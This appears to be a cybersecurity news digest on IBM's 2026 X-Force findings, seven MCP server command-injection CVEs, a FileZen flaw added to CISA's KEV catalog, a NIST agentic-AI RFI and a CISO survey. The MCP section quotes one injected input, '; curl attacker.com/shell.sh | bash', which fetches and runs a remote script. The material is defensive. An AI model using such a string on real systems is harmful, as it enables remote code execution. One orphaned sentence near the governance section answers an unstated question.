## **The Intelligence Is Stacking Up: IBM Drops the 2026 X-Force Index — And the Numbers Are Worse Than You Think**

This morning IBM released the **2026 X-Force Threat Intelligence Index**, its annual census of the threat landscape built on incident response data, penetration test findings, and dark web telemetry from across the globe. The headline figure that belongs on every CISO's morning briefing: **a 44% increase in attacks that began by exploiting public-facing applications** — the fastest-growing initial access vector in the dataset. The root cause is as unglamorous as it is urgent: missing authentication controls, combined with AI-enabled vulnerability discovery that has weaponized the gap between patch release and patch deployment.

The full picture from X-Force is one of compounding acceleration across every threat category:

- **Vulnerability exploitation** is now the **#1 cause of incidents** — 40% of all cases observed in 2025
- **Over 300,000 ChatGPT credential sets** were advertised for sale on dark web markets in 2025, driven by infostealers that have expanded their target lists to include AI platforms alongside traditional enterprise SaaS
- **49% increase** in active ransomware and extortion groups year-over-year, as smaller operators armed with leaked tooling and AI automation fragment the ecosystem — making attribution harder and attack frequency higher
- **Supply chain and third-party compromises** have nearly **quadrupled since 2020**, driven by attackers systematically exploiting CI/CD pipelines, developer tool integrations, and SaaS trust relationships
- North Korean IT worker schemes are now using **AI-driven image manipulation** for synthetic identity creation and AI translation tools to scale their global marketplace operations

The most structurally significant finding is also the least glamorous: **basic controls are still failing**. X-Force Red penetration tests continue to find credential hygiene and access control misconfiguration as the most common enterprise entry point. The AI acceleration story isn't about exotic zero-days — it's about attackers using AI to find the unchanged default credentials, the authentication-free admin panel, the unpatched edge device, **faster than any human security team can catch them.**

> **"Attackers aren't reinventing playbooks — they're speeding them up with AI. With so many vulnerabilities requiring no credentials, attackers can bypass humans and move straight from scanning to impact."** — Mark Hughes, Global Managing Partner for Cybersecurity Services, IBM

**The identity problem has an AI-specific dimension that organizations are only beginning to address.** Compromised chatbot credentials aren't just a simple account takeover. An attacker with a stolen ChatGPT or Claude session can manipulate outputs, exfiltrate context from prior conversations, and inject malicious prompts into ongoing workflows. X-Force explicitly flags this as a new risk category: **AI-platform credential harvesting that creates downstream enterprise exposure through password reuse across personal and enterprise accounts.** The employees who use Claude to draft work documents and the same email/password for their enterprise SSO are now an attack surface that didn't exist eighteen months ago.

**Immediate actions from the X-Force findings:**
- Audit all public-facing applications for authentication enforcement — this is the highest-ROI fix available given the 44% YoY increase
- Extend infostealer credential monitoring to include AI platform credentials (ChatGPT, Claude, Copilot), not just enterprise SaaS
- Treat supply chain and CI/CD pipeline access as equivalent in sensitivity to production system access — because in most organizations, it effectively is

## **The MCP Vulnerability Avalanche: Seven CVEs in One Month — And the Root Cause Is One Line of Code**

Yesterday, security researcher **Kai** published a landmark technical analysis on DEV Community that has been circulating all morning: **seven Model Context Protocol (MCP) CVEs published in February 2026 alone**, all remote code execution, all sharing a single root cause — **user-controlled input reaching dangerous execution functions without sanitization**. This is the MCP vulnerability crisis arriving at industrial scale.

The seven CVEs and their affected servers form a precise taxonomy:

| CVE | Server | Vulnerable Function | Root Cause |
|-----|--------|-------------------|------------|
| CVE-2026-0755 | gemini-mcp-tool | `execAsync` | Shell metacharacter injection |
| CVE-2026-1977 | mcp-vegalite-server | `eval(vegalite_specification)` | Python eval on user input |
| CVE-2026-2008 | fermat-mcp | equation string evaluation | Python eval on equations |
| CVE-2026-2131 | HarmonyOS-mcp-server | `input_text` | OS command injection |
| CVE-2026-2178 | xcode-mcp-server | `run_lldb` | Command injection in debugger |
| CVE-2026-25546 | godot-mcp | `executeOperation projectPath` | exec() with unsanitized path |
| CVE-2026-26029 | sf-mcp-server | `child_process.exec` | Shell injection in Salesforce MCP |

What makes this analysis important isn't just the count — it's the **disclosure failure pattern** the researcher documents alongside it. **CVE-2026-0755 (gemini-mcp-tool)** has a particularly revealing history. Zero Day Initiative (Trend Micro's vulnerability research arm) discovered the flaw on July 25, 2025 — seven months before publication. They followed standard coordinated disclosure: notify the vendor, set a deadline, wait. The vendor never responded. ZDI followed up in November 2025. Still no response. The advisory went public on January 9, 2026 with **no patch available**.

This is responsible disclosure failing in slow motion against the structural reality of the MCP ecosystem. Most MCP servers are built by individual developers who didn't design for adversarial use, lack a security disclosure process, and aren't monitoring for CVEs against their own projects. The researcher reports a personal disclosure rate that reflects this: across 16 responsible disclosures to network-exposed MCP servers, response rates are low.

### **The Architectural Insight That Changes Your Threat Model**

The seven CVEs aren't random — they cluster in a specific category: **integration tools**. Gemini integrations. Salesforce connectors. Xcode debugger bridges. Godot game engine adapters. These are MCP servers that give AI agents access to other systems — and that's precisely why they're dangerous. The feature is arbitrary execution. The question is whether adversarial input can reach that execution path. In all seven cases: it could.

> **The mental model that created these vulnerabilities:** "An AI agent is calling this with real project paths." The correct mental model: "A malicious actor is calling this with `; curl attacker.com/shell.sh | bash`." Any network-accessible MCP server must be designed for the second assumption.

**A parallel analysis** from the same researcher documents a dataset of 560 scanned MCP servers: **38% have no authentication layer**. Combined with unauthenticated RCE vulnerabilities, the result is unambiguous: unauthenticated access + exploitable shell injection = full system compromise via any connected AI agent.

**Detection actions for organizations running MCP infrastructure:**
- Audit all MCP server configurations for `exec()`, `eval()`, and `child_process.exec` patterns in user input handling
- Implement authentication on every MCP server that exposes shell or system access — no exceptions
- Check `~/.config/claude/`, `~/.cursor/`, `~/.vscode/continue/` for unexpected MCP server entries (relevant carry-over from the SANDWORM_MODE disclosure)

## **Technical Deep Dives**

### **1. CISA Adds FileZen OS Command Injection to KEV — Deadline March 17 for Federal Agencies**

CISA this morning added **CVE-2026-25108** (CVSS v4: 8.7) to the Known Exploited Vulnerabilities catalog, confirming active exploitation in the wild. The vulnerability is an **OS command injection flaw in Soliton Systems' FileZen secure file transfer solution** — and the affected version range is wide: versions 4.2.1 through 4.2.8, and 5.0.0 through 5.0.10.

The exploit chain requires an authenticated session with general user privileges — but that bar is lower than it sounds. Once authenticated, a specially crafted HTTP request is sufficient to achieve arbitrary command execution. Soliton confirmed they've received **at least one report of damage caused by exploitation**. The company disclosed a critical caveat: exploitation is only possible when the **FileZen Antivirus Check Option is enabled** — organizations that have not enabled that feature are not vulnerable to this specific vector.

**Why file transfer appliances keep appearing in the KEV catalog** is worth addressing directly. FileZen follows MOVEit, GoAnywhere, Cleo, and a parade of similar products. These appliances sit at the DMZ, handle sensitive document flows, and run software that is frequently outdated because upgrade cycles are painful and the appliances are "working fine." That combination — internet-facing, sensitive data, stale software — makes them consistently high-value targets for nation-state and financially motivated actors alike.

**Patch path:** Upgrade to FileZen v5.0.11 or later. If exploitation is suspected, change all user passwords in addition to patching — an attacker with at least one valid account credential likely has them.

Federal Civilian Executive Branch agencies have a **hard deadline of March 17, 2026**.

### **2. NIST Opens the Agentic AI Security RFI — The First Federal Standard for Autonomous Agents**

A story that moved quietly last week but is now generating significant practitioner conversation: **NIST has launched the AI Agent Standards Initiative** and issued an RFI on security practices specifically for agentic AI systems — **autonomous AI that takes actions affecting real-world systems** (trading bots, automated operations, multi-agent coordination). The deadline for public comment is **March 9, 2026 at 11:59 PM ET**, and this is the first formal federal rulemaking effort targeting autonomous agents as a distinct security category.

The NIST RFI addresses four focus areas that security practitioners have been discussing in the absence of any formal framework:

1. **Novel threats specific to agents:** Prompt injection, behavioral hijacking, and cascade failures — scenarios where one agent manipulating another propagates compromise across an entire multi-agent system
2. **Framework adaptation:** How existing security frameworks (STRIDE, attack trees) need to adapt for AI agents that make autonomous decisions and take real-world actions
3. **Technical controls and assessment methodologies:** What does a security audit of an AI agent actually look like?
4. **Agent registration and tracking:** Conceptually analogous to drone registration — a tracking layer for deployed autonomous agents with real-world access

The practitioner signal here is significant: **NIST is soliciting comment from people actually deploying these systems**, and early indicators suggest the comment period will draw substantial engagement from industry, academia, and civil society. This is the window to shape what agentic AI security standards look like before they're imposed.

> **The stakes of non-participation:** Practitioners who don't submit comments cede the definition of "secure agentic AI" to parties who may have less operational reality. The 43-question RFI is linked below. If you're deploying agents in production, questions 1(a), 1(d), 2(a), 2(e), 3(a), 3(b), 4(a), 4(b), and 4(d) are the highest-priority.

## **Enterprise Crisis & Governance**

### **The CISO Mandate Has Expanded — And 86% of CISOs Are Afraid of Their Own AI Deployments**

Cisco and Splunk released the **2026 CISO Report: From Risk to Resilience in the AI Era** this morning, based on survey data from 650 CISOs globally. The report captures a professional role that has been fundamentally redefined — and a risk posture that is increasingly internally contradictory.

The expansion of the CISO mandate is categorical:
- **Nearly all respondents** report expanded responsibilities now spanning AI governance and enterprise-wide risk management — not just security operations
- **More than four in five** now directly oversee secure software development practices
- The security perimeter is no longer a network boundary; it is **every AI model, every agent deployment, every API integration** across the enterprise

The AI threat perception data reveals the specific fears shaping CISO decision-making:

- **92%** say AI allows their teams to review more security events and improves data correlation — the defense story is positive
- **86%** fear agentic AI will **increase the sophistication of social engineering attacks** — attackers using AI agents to dynamically refine phishing and manipulation in real time, not from static templates
- **82%** anticipate greater deployment complexity in persistence mechanisms — AI-generated malware that adapts its persistence techniques based on observed defenses

The internal contradiction is sharp: CISOs are simultaneously expanding their AI security tooling (because it works) and deploying AI agents into business functions they are not confident they can secure. This is not cognitive dissonance — it's the operational reality of a technology transition where stopping deployment isn't an option, and securing it remains an open problem.

> **The read-across to IBM's X-Force data:** IBM documents 300,000 AI platform credentials on dark web markets. Splunk documents 86% of CISOs afraid of AI-enhanced social engineering. These are two angles on the same convergence: AI platforms are simultaneously the most important tools for defense and an expanding, credential-rich attack surface.

**The governance message from the Mayer Brown analysis** (published yesterday) adds legal framing to this picture: agentic AI systems now require formal stakeholder governance structures — not just a security team, but defined accountability roles for decisionmakers, product teams, cybersecurity and privacy teams, and frontline employees who act on agent output. The governance gap isn't just a technology problem. It's an organizational design problem.

The emerging practitioner consensus: yes, and the playbook is the same (password manager, unique credentials, MFA), but security teams don't yet have good tooling to monitor AI platform credential exposure the way they monitor enterprise SSO exposure.

## **📊 Stat of the Day**

> **300,000.** That's the number of AI chatbot credential sets — specifically ChatGPT credentials — advertised for sale on dark web markets in 2025 alone, according to IBM X-Force.
>
> These aren't just account takeovers. An attacker with a valid ChatGPT session inherits the conversation history, the injected documents, the custom instructions, and potentially the organizational context that employee loaded into the model. For enterprises where employees use AI platforms for work — and that's most of them — this is a data exfiltration channel that most DLP tools cannot see.
>
> **The fix is the same one security teams have been giving employees for twenty years:** unique credentials, a password manager, and MFA. The difference is that most security teams haven't extended that hygiene requirement to AI platforms yet. Time to close the gap.
